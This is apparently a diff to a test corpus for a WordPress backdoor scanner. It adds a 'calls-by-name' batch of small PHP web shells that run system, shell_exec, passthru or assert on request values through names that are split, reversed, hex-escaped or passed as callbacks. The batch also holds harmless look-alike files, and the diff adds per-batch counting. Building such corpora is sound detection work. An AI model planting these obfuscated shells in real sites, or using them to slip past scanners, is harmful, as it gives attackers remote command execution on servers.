@@ -28,6 +28,10 @@
  *   "flag"     any finding
  *   "missed"   a known gap: the scanner does not catch this yet
  *   "included" caught only when skipped folders and large files are scanned
+ *
+ * `set` names the batch a file was added in. Files without one are the base
+ * set. The counts are kept per set as well as in total, so adding files
+ * never moves a figure that was reported before.
  */
 
 import { promises as fs } from "node:fs";
@@ -807,6 +811,248 @@ export const CORPUS = [
     technique: "shell padded past the 5 MB size limit",
     expect: "included",
     content: php("eval($_POST['x']);", "/*", "A".repeat(5 * 1024 * 1024 + 4096), "*/")
+  },
+
+  // ----- set "calls-by-name": a command or code function called through a
+  // string that holds its name. Added with the checks in src/calls.js and
+  // counted apart from the files above, so earlier figures stay comparable.
+  {
+    path: `${P}/includes/class-joiner.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name joined with .= and called on a request value held in a variable",
+    expect: "missed",
+    content: php("$n = 'pass';", "$n .= 'thru';", "$cmd = $_POST['cmd'];", "$n($cmd);")
+  },
+  {
+    path: `${P}/includes/class-compat.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name joined with implode",
+    expect: "missed",
+    content: php("$f = implode('', array('sh', 'ell', '_ex', 'ec'));", "echo $f($_REQUEST['q']);")
+  },
+  {
+    path: `${T}/inc/glyphs.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name built from chr() pieces",
+    expect: "missed",
+    content: php("$f = chr(115) . chr(121) . chr(115) . 'tem';", "$f($_COOKIE['k']);")
+  },
+  {
+    path: `${P}/includes/class-bridge.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name passed as a callback",
+    expect: "missed",
+    content: php("call_user_func('ass' . 'ert', $_POST['x']);")
+  },
+  {
+    path: `${P}/includes/sorter.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "system as a sort callback on request values held in a variable",
+    expect: "missed",
+    content: php("$a = array($_POST['a'], $_POST['b']);", "usort($a, 'system');")
+  },
+  {
+    path: "wp-includes/class-wp-shutdown.php",
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "system registered as a shutdown function with a request value",
+    expect: "missed",
+    content: php("register_shutdown_function('system', $_GET['c']);")
+  },
+  {
+    path: `${P}/includes/validate.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "assert as a filter_var callback",
+    expect: "missed",
+    content: php("filter_var($_REQUEST['c'], FILTER_CALLBACK, array('options' => 'assert'));")
+  },
+  {
+    path: `${T}/inc/inline.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name called straight from brackets",
+    expect: "missed",
+    content: php("('sys' . 'tem')($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-spaced.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name with comments between the pieces and before the bracket",
+    expect: "missed",
+    content: php("$f = 'sys' /* a */ . 'tem';", "$f /* b */ ($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-named.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name held whole in a variable",
+    expect: "missed",
+    content: php("$f = 'system';", "$f($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-escaped.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name written with a hex escape",
+    expect: "missed",
+    content: php('$f = "\\x73ystem";', "$f($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-decoy.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name with a harmless reassignment inside a branch",
+    expect: "missed",
+    content: php("$f = 'sys' . 'tem';", "if (isset($_GET['plain'])) { $f = 'trim'; }", "echo $f($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-closure.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name carried into a closure with use",
+    expect: "missed",
+    content: php("$f = 'sys' . 'tem';", "$run = function () use ($f) { return $f($_POST['c']); };", "$run();")
+  },
+  {
+    path: `${P}/includes/class-reversed.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name reversed with strrev",
+    expect: "missed",
+    content: php("$f = strrev('metsys');", "$f($_GET['c']);")
+  },
+  {
+    path: `${P}/includes/class-pieces.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "function name joined from array elements",
+    expect: "missed",
+    content: php("$p = array('sys', 'tem');", "$f = $p[0] . $p[1];", "$f($_GET['c']);")
+  },
+  {
+    path: `${T}/inc/buffer.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "system as an output buffer callback",
+    expect: "missed",
+    content: php("ob_start('system');", "echo $_GET['c'];", "ob_end_flush();")
+  },
+  {
+    path: `${P}/includes/class-fixed.php`,
+    group: "disguised",
+    set: "calls-by-name",
+    technique: "joined name called on a fixed value, with no request input",
+    expect: "missed",
+    content: php("$f = 'sys' . 'tem';", "$f('uptime');")
+  },
+  {
+    path: `${P}/includes/class-request-filters.php`,
+    group: "clean",
+    set: "calls-by-name",
+    technique: "harmless callbacks called on request input",
+    expect: "quiet",
+    content: text(
+      "<?php",
+      "// Tidy what the form sends before it is used.",
+      "$tags = array_map('trim', (array) $_POST['tags']);",
+      "$ids = array_filter((array) $_GET['ids'], 'is_numeric');",
+      "usort($tags, 'strcasecmp');",
+      "$title = call_user_func('sanitize_text_field', $_POST['title']);",
+      "$rows = array_map(array($table, 'exec'), (array) $_POST['rows']);",
+      "register_shutdown_function('acme_forms_flush', $_GET['form']);"
+    )
+  },
+  {
+    path: `${P}/includes/class-dispatcher.php`,
+    group: "clean",
+    set: "calls-by-name",
+    technique: "handler and helper names joined from pieces and called",
+    expect: "quiet",
+    content: text(
+      "<?php",
+      "$action = isset($_GET['action']) ? $_GET['action'] : 'list';",
+      "$allowed = array('list', 'view', 'export');",
+      "if (in_array($action, $allowed, true)) {",
+      "    $handler = 'acme_forms_handle_' . $action;",
+      "    if (function_exists($handler)) {",
+      "        $handler($_GET);",
+      "    }",
+      "}",
+      "$fn = 'str' . 'toupper';",
+      "echo esc_html($fn($_GET['label']));",
+      "$method = 'get_' . 'title';",
+      "echo esc_html($form->$method());"
+    )
+  },
+  {
+    path: `${P}/includes/class-help.php`,
+    group: "clean",
+    set: "calls-by-name",
+    technique: "calls by name quoted in comments, strings and a nowdoc",
+    expect: "quiet",
+    content: text(
+      "<?php",
+      "/**",
+      " * What a scanner looks for. None of this is code:",
+      " *   $f = 'sys' . 'tem'; $f($_GET['c']);",
+      " *   array_filter(array($_GET['c']), 'system');",
+      " */",
+      "// call_user_func('ass' . 'ert', $_POST['x']);",
+      "$help = \"A backdoor may write \\$f = 'sys' . 'tem'; and then \\$f(\\$_GET['c']);\";",
+      "$more = 'or array_map(\"system\", array($_GET[\"c\"]));';",
+      "$sample = <<<'TXT'",
+      "$f = 'sys' . 'tem';",
+      "$f($_GET['c']);",
+      "usort($a, 'system');",
+      "TXT;",
+      "echo esc_html($help . $more . $sample . $_GET['topic']);"
+    )
+  },
+  {
+    path: `${P}/includes/class-environment.php`,
+    group: "clean",
+    set: "calls-by-name",
+    technique: "shell function named in pieces for a capability check and never called",
+    expect: "quiet",
+    content: text(
+      "<?php",
+      "function acme_forms_can_shell() {",
+      "    $fn = 'shell' . '_exec';",
+      "    return function_exists($fn) && is_callable($fn);",
+      "}",
+      "function acme_forms_apply($fn) {",
+      "    return $fn($_GET['label']);",
+      "}",
+      "echo esc_html(acme_forms_apply('strtoupper'));",
+      "$fn = 'shell' . '_exec';",
+      "$can = function_exists($fn);",
+      "$fn = 'esc_html';",
+      "echo $fn($_GET['label']);"
+    )
+  },
+  {
+    path: `${P}/includes/class-report.php`,
+    group: "clean",
+    set: "calls-by-name",
+    technique: "methods and classes that share a command function's name",
+    expect: "quiet",
+    content: text(
+      "<?php",
+      "$section = 'system';",
+      "echo esc_html($report->$section($_GET['tab']));",
+      "echo esc_html(Acme_Report::$section($_GET['tab']));",
+      "$panel = new $section($_GET['tab']);",
+      "call_user_func(array($report, 'system'), $_GET['tab']);",
+      "call_user_func('Acme_Report::system', $_GET['tab']);",
+      "array_map('acme_system_row', (array) $_POST['rows']);"
+    )
   }
 ];
 
@@ -821,7 +1067,7 @@ export async function buildCorpus(dir) {
     const full = path.join(root, ...item.path.split("/"));
     await fs.mkdir(path.dirname(full), { recursive: true });
     await fs.writeFile(full, item.content);
-    files.push({ path: item.path, group: item.group, technique: item.technique, expect: item.expect });
+    files.push({ path: item.path, group: item.group, set: item.set || "base", technique: item.technique, expect: item.expect });
   }
   const manifest = path.join(dir, "manifest.json");
   await fs.writeFile(
@@ -865,14 +1111,17 @@ export async function measure(root, scan, options = {}) {
   }
 
   const groups = {};
+  const sets = {};
   const files = [];
   for (const item of CORPUS) {
     const hit = byPath.get(item.path) || null;
-    const g = (groups[item.group] ||= { total: 0, flagged: 0, serious: 0 });
-    g.total++;
-    if (hit) g.flagged++;
-    if (hit && RANK[hit.top] >= RANK.high) g.serious++;
-    files.push({ ...item, content: undefined, top: hit ? hit.top : null, rules: hit ? hit.rules : [] });
+    const set = item.set || "base";
+    for (const g of [(groups[item.group] ||= { total: 0, flagged: 0, serious: 0 }), ((sets[set] ||= {})[item.group] ||= { total: 0, flagged: 0, serious: 0 })]) {
+      g.total++;
+      if (hit) g.flagged++;
+      if (hit && RANK[hit.top] >= RANK.high) g.serious++;
+    }
+    files.push({ ...item, set, content: undefined, top: hit ? hit.top : null, rules: hit ? hit.rules : [] });
   }
-  return { groups, files };
+  return { groups, sets, files };
 }
